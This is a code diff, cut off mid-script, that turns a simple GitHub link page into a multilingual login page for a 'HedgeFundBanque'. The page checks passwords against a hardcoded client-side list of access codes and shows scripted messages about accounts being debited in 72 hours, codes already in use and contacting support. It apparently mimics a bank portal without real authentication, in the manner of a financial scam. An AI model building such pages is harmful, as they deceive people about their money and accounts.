@@ -3,11 +3,158 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mon lien GitHub</title>
+    <title>Connexion HedgeFundBanque</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: #00008B; /* Couleur bleu de nuit */
+        }
+        .container {
+            text-align: center;
+        }
+        #logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        #login-form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 20px;
+        }
+        input {
+            margin: 10px 0;
+            padding: 10px;
+            width: 200px;
+            border: 2px solid #00008B; /* Couleur bleu de nuit */
+            border-radius: 4px;
+        }
+        button {
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+        #message {
+            display: none;
+            margin-top: 20px;
+        }
+        .progress {
+            display: none;
+            margin-top: 20px;
+            width: 200px;
+            height: 20px;
+            background-color: #f3f3f3;
+            border: 1px solid #00008B; /* Couleur bleu de nuit */
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0;
+            background-color: #00008B; /* Couleur bleu de nuit */
+            transition: width 1s;
+        }
+        .language-selector {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+        }
+    </style>
 </head>
 <body>
-    <h1>Mon lien GitHub</h1>
-    <p>Cliquez sur le lien ci-dessous pour accéder à mon dépôt GitHub :</p>
-    <p><a href="https://github.com/votre-nom-utilisateur/mon-projet">Accéder à mon dépôt GitHub</a></p>
-</body>
-</html>
+    <div class="container">
+        <div class="language-selector">
+            <select id="language" onchange="changeLanguage()">
+                <option value="fr">Français</option>
+                <option value="en">English</option>
+                <option value="es">Español</option>
+                <option value="de">Deutsch</option>
+                <option value="zh">中文</option>
+                <option value="ar">العربية</option>
+                <option value="ru">Русский</option>
+            </select>
+        </div>
+        <img id="logo" src="logo.png" alt="Logo HedgeFundBanque">
+        <form id="login-form">
+            <input type="email" id="email" placeholder="Email" required>
+            <input type="password" id="password" placeholder="Mot de passe" required>
+            <button type="button" onclick="login()">OK</button>
+        </form>
+        <div class="progress">
+            <div class="progress-bar" id="progress-bar"></div>
+        </div>
+        <p id="message"></p>
+        <p id="countdown"></p>
+    </div>
+    <script>
+        const validPasswords = [
+            'QwErTy12', 'UiOpAs34', 'DfGhJk56', 'LzXcVb78', 'NmQwEr90', 'TzUiOp12', 'AsDfGh34', 'JkLzXc56', 'VbNmQw78',
+            'ErTyUi90', 'OpAsDf12', 'GhJkLz34', 'XcVbNm56', 'QwErTy78', 'UiOpAs90', 'DfGhJk12', 'LzXcVb34', 'NmQwEr56',
+            'TyUiOp78', 'AsDfGh90', 'JkLzXc12', 'VbNmQw34', 'ErTyUi56', 'OpAsDf78', 'GhJkLz90', 'XcVbNm12', 'QwErTy34',
+            'UiOpAs56', 'DfGhJk78', 'LzXcVb90', 'NmQwEr12', 'TyUiOp34', 'AsDfGh56', 'JkLzXc78', 'VbNmQw90', 'ErTyUi12',
+            'OpAsDf34', 'GhJkLz56', 'XcVbNm78', 'QwErTy90', 'UiOpAs12', 'DfGhJk34', 'LzXcVb56', 'NmQwEr78', 'TyUiOp90',
+            'AsDfGh12', 'JkLzXc34', 'VbNmQw56', 'ErTyUi78', 'OpAsDf90', 'GhJkLz12', 'XcVbNm34', 'QwErTy56', 'UiOpAs78',
+            'DfGhJk90', 'LzXcVb12', 'NmQwEr34', 'TyUiOp56', 'AsDfGh78', 'JkLzXc90', 'VbNmQw12', 'ErTyUi34', 'OpAsDf56',
+            'GhJkLz78', 'XcVbNm90', 'QwErTy12', 'UiOpAs34', 'DfGhJk56', 'LzXcVb78', 'NmQwEr90', 'TyUiOp12', 'AsDfGh34',
+            'JkLzXc56', 'VbNmQw78', 'ErTyUi90', 'OpAsDf12', 'GhJkLz34', 'XcVbNm56', 'QwErTy78', 'UiOpAs90', 'DfGhJk12'
+        ];
+
+        const messages = {
+            "fr": {
+                "congratulations": "Félicitations pour vos efforts, votre compte sera déduit dans 72 heures.",
+                "codeInUse": "Ce code est déjà utilisé par une autre personne.",
+                "contactSupport": "Veuillez contacter le support technique.",
+                "accountReady": "Votre compte est maintenant opérationnel."
+            },
+            "en": {
+                "congratulations": "Congratulations on your efforts, your account will be debited within 72 hours.",
+                "codeInUse": "This code is already used by another person.",
+                "contactSupport": "Please contact technical support.",
+                "accountReady": "Your account is now operational."
+            },
+            "es": {
+                "congratulations": "Felicitaciones por sus esfuerzos, su cuenta se debitará en 72 horas.",
+                "codeInUse": "Este código ya está siendo utilizado por otra persona.",
+                "contactSupport": "Por favor, póngase en contacto con el soporte técnico.",
+                "accountReady": "Su cuenta ya está operativa."
+            },
+            "de": {
+                "congratulations": "Glückwunsch zu Ihren Bemühungen, Ihr Konto wird innerhalb von 72 Stunden belastet.",
+                "codeInUse": "Dieser Code wird bereits von einer anderen Person verwendet.",
+                "contactSupport": "Bitte wenden Sie sich an den technischen Support.",
+                "accountReady": "Ihr Konto ist jetzt betriebsbereit."
+            },
+            "zh": {
+                "congratulations": "恭喜您的努力，您的账户将在72小时内扣款。",
+                "codeInUse": "此代码已被其他人使用。",
+                "contactSupport": "请联系技术支持。",
+                "accountReady": "您的账户现在已激活。"
+            },
+            "ar": {
+                "congratulations": "تهانينا على جهودك ، سيتم خصم حسابك خلال 72 ساعة.",
+                "codeInUse": "هذا الرمز مستخدم بالفعل من قبل شخص آخر.",
+                "contactSupport": "يرجى الاتصال بالدعم الفني.",
+                "accountReady": "حسابك الآن جاهز للعمل."
+            },
+            "ru": {
+                "congratulations": "Поздравляем с вашими усилиями, ваш счет будет списан в течение 72 часов.",
+                "codeInUse": "Этот код уже используется другим человеком.",
+                "contactSupport": "Пожалуйста, свяжитесь с технической поддержкой.",
+                "accountReady": "Ваш аккаунт теперь активен."
+            }
+        };
+
+        let usedPasswords = JSON.parse(localStorage.getItem('usedPasswords') || '{}');
+        let startTime = localStorage.getItem('startTime');
+
+        function login() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const progressBar = document.getElementById('progress-bar');
+            const message = document.getElementById('message');
+            const countdown
